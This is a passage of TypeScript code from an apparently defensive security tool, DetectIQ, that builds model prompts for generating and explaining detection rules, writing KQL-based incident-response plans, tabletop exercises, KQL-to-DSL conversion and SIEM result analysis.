      1. Analyze the input description to understand the threat or behavior.
      2. Generate a high-quality, well-structured ${ruleType} rule.
      3. Provide a clear, natural language explanation of what the rule detects and how it works.
      ${(ruleType === 'Sigma' && siemTarget) ? `4. Translate the Sigma rule into a functional query for ${siemTarget}.` : ''}
      5. Return the result as a single JSON object. Do not wrap it in a markdown block.
      
      **JSON Output Schema:**
      {
        "rule": "<The full text of the generated ${ruleType} rule>",
        "explanation": "<The natural language explanation of the rule>",
        "query": "<${(ruleType === 'Sigma' && siemTarget) ? `The translated ${siemTarget} query` : 'null'}>"
      }
    `;

    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanJsonResponse(response.text());
    } catch (error) {
        console.error("Error in generateDetectionRule:", error);
        throw new Error(`Failed to generate detection rule. ${error instanceof Error ? error.message : ''}`);
    }
};

export const optimizeDetectionRule = async (
    existingRule: string, 
    modelName: string
): Promise<DetectIQOutput> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });

    const prompt = `
      You are DetectIQ, an AI-powered detection engineering workbench.
      Your task is to analyze and refactor an existing detection rule to improve its logic, performance, and accuracy.

      **Existing Rule:**
      \
      ${existingRule}
      \

      **Instructions:**
      1. Analyze the rule for potential issues like being too broad (noisy), too narrow, inefficient, or syntactically incorrect.
      2. Rewrite the rule to address these issues. This may involve adding more specific conditions, using more performant fields, or clarifying the logic.
      3. Provide a detailed explanation of the changes you made and the reasoning behind them (e.g., "Added a filter to reduce false positives from common administrative tools.").
      4. Return the result as a single JSON object. Do not wrap it in a markdown block.
      
      **JSON Output Schema:**
      {
        "rule": "<The full text of the REFACTORED rule>",
        "explanation": "<The detailed explanation of the changes made>"
      }
    `;

    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanJsonResponse(response.text());
    } catch (error) {
        console.error("Error in optimizeDetectionRule:", error);
        throw new Error(`Failed to optimize detection rule. ${error instanceof Error ? error.message : ''}`);
    }
};

export const explainDetectionRule = async (
    rule: string, 
    modelName: string
): Promise<DetectIQOutput> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });

    const prompt = `
      You are DetectIQ, an AI-powered detection engineering workbench.
      Your task is to provide a clear, natural language explanation of a security detection rule.

      **Rule to Explain:**
      \
      ${rule}
      \

      **Instructions:**
      1. Analyze the rule's components (e.g., selection, condition, strings).
      2. Describe the threat or behavior it is designed to detect in simple terms.
      3. Explain how the different parts of the rule work together to identify that behavior.
      4. Return the result as a single JSON object. Do not wrap it in a markdown block.

      **JSON Output Schema:**
      {
        "explanation": "<The detailed, natural language explanation of the rule>"
      }
    `;
    
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanJsonResponse(response.text());
    } catch (error) {
        console.error("Error in explainDetectionRule:", error);
        throw new Error(`Failed to explain detection rule. ${error instanceof Error ? error.message : ''}`);
    }
};

export const generateIrPlan = async (objective: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are a Senior Incident Response Analyst, an expert in using the ELK Stack (Elastic Security) and Kibana Query Language (KQL) for threat hunting.
      Your task is to create a structured, multi-stage investigation plan based on a high-level incident description.
      Do not include any conversational preamble, introduction, conclusion, or any text other than the plan itself. The output must be only the plan in markdown format.

      **Incident Description:** ${objective}

      **Instructions:**
      1.  Break the investigation down into logical phases (e.g., Initial Triage, Host-Based Investigation, Network Analysis). Use Markdown H3 headings (
###
) for phase titles.
      2.  Within each phase, provide multiple, specific, actionable steps for an analyst to follow.
      3.  Each step must consist of an "Action" and a corresponding "KQL Query".
      4.  Format each step exactly as follows:
          - Start with '**Action:**' followed by a description of the investigation action.
          - On a new line, write '**KQL Query:**'.
          - On the next line, provide a KQL code block.
      5.  Separate each Action/Query pair with a markdown horizontal rule (
---
).

      **Strict Output Format Example:**
      ### Initial Triage
      **Action:** Identify all hosts communicating with the known C2 domain to understand the initial scope.
      **KQL Query:**
      \
      \
      (event.category:network or event.category:network_traffic) and destination.domain:"<C2_DOMAIN>"
      \
      \
      ---
      **Action:** From the initial network events, identify the specific process(es) responsible for the C2 communication on an affected host.
      **KQL Query:**
      \
      \
      (event.category:network or event.category:network_traffic) and destination.domain:"<C2_DOMAIN>" and process.name:*
      \
      \
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text().trim();
    } catch (error) {
        console.error("Error generating IR plan:", error);
        return `### IR Plan Generation Error\nCould not generate plan.`;
    }
};

export const generateIrTabletopScenario = async (objective: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are a world-class cybersecurity consultant specializing in incident response (IR) and business continuity planning.
      Your task is to create a detailed, professional, and engaging tabletop exercise scenario based on a user-provided threat.
      The scenario should be formatted in clean, readable markdown.

      **Threat Description:** ${objective}

      **Instructions:**
      Generate a complete tabletop exercise document with the following sections:

      1.  **Title:** A compelling title for the exercise.
      2.  **Executive Summary:** A brief, high-level overview for leadership.
      3.  **Exercise Objectives:** 3-5 clear, measurable goals (e.g., "Assess the IR team's ability to identify the initial infection vector").
      4.  **Scope:** Define what is in and out of scope for the exercise (e.g., "This exercise focuses on the detection and containment phases," "This exercise will not simulate media relations").
      5.  **Scenario Narrative:** A detailed, story-driven narrative of the attack as it unfolds. It should be plausible and create a sense of urgency.
      6.  **Injects:** A series of timed events or pieces of information ("injects") to be given to the participants to drive the exercise forward. Each inject should have a timestamp (e.g., T+0h, T+1h), a description of the event, and the information to be provided.
      7.  **Key Discussion Points:** A list of questions for the facilitator to ask the participants at various stages, designed to provoke thought and evaluate procedures (e.g., "How would we determine the scope of the breach?", "What is our policy on ransom payments?").

      Ensure the content is professional, technically accurate, and tailored to the threat description.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text().trim();
    } catch (error) {
        console.error("Error generating IR tabletop scenario:", error);
        return `### IR Tabletop Scenario Generation Error\nCould not generate the scenario.`;
    }
};

export const convertKqlToDsl = async (
    kqlQuery: string,
    variables: Record<string, string>,
    modelName: string
): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    let populatedQuery = kqlQuery;
    for (const key in variables) {
        populatedQuery = populatedQuery.replace(new RegExp(key, 'g'), `"${variables[key]}"`);
    }

    const prompt = `
      You are an expert in Elastic Stack. Convert the following Kibana Query Language (KQL) query into a complete Elasticsearch Query DSL JSON object suitable for a 
      _search
       endpoint.
      - The final output must be ONLY the raw JSON object.
      - It should have a top-level "query" key.
      - Include a "size" key set to 100.
      - Do not include explanations or markdown code blocks.

      **KQL Query:**
      \
      \
      ${populatedQuery}
      \
      \
    `;

    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return JSON.stringify(cleanJsonResponse(response.text()), null, 2);
    } catch (error) {
        console.error("Error in convertKqlToDsl:", error);
        throw new Error(`Failed to convert KQL to DSL. ${error instanceof Error ? error.message : ''}`);
    }
};

export const analyzeSiemResponse = async (
    siemResponse: string,
    modelName: string
): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are a senior security analyst. Analyze the following raw Elasticsearch query result from a SIEM.
      Provide a concise summary of the findings. Highlight any suspicious activity, identify key entities (users, hosts, processes), and suggest the next logical step in the investigation.
      If there are no results, state that clearly.

      **SIEM Response JSON:**
      \
      ${siemResponse}
      \

      Format your response as a clear, readable markdown report.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error in analyzeSiemResponse:", error);
        throw new Error(`Failed to analyze SIEM response. ${error instanceof Error ? error.message : ''}`);
    }
};
